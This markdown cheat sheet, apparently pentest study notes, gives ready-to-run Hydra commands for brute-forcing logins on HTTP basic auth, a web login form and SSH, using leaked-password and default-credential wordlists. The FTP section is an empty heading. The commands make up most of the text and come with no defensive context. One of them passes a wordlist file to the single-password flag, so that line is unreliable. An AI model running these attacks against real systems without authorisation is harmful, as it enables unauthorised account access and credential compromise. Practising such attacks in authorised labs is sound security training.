# Brute Forcing using Hydra

In order to install it, type ``` sudo apt install hydra -y ``` or [download here](https://github.com/vanhauser-thc/thc-hydra)

## Attacking HTTP Basic Auth
For the purpose of attacking HTTP basic auth, type :
 ```
 hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p admin -u -f SERVER_IP -s SERVER_PORT http-get /

 ```
 or
 ```
 hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p /usr/share/SecLists/Passwords/Default-Credentials/default-passwords.txt -u -f SERVER_IP -s SERVER_PORT http-get /

 ```
 or in order to use the default credentials, type:
 ```
 hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt  -f -u SERVER_IP -s SERVER_PORT http-get / -I
``` 


## Attacking HTTP Formulary

In order to attack some page wich contains form, you must use the **http-post-form** module of hydra. There's an example :
```
 sudo hydra -l admin -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -f $ip -s $port http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

```

## Attacking SSH 

In order to attack SSH service, open the terminal and type :
 
 ```
 hydra -L USERNAME_WORDLIST -P PASSWORD_WORDLIST -u -f ssh://IP_ADDRESS:PORT -t 4
 ```

## Attacking FTP
 

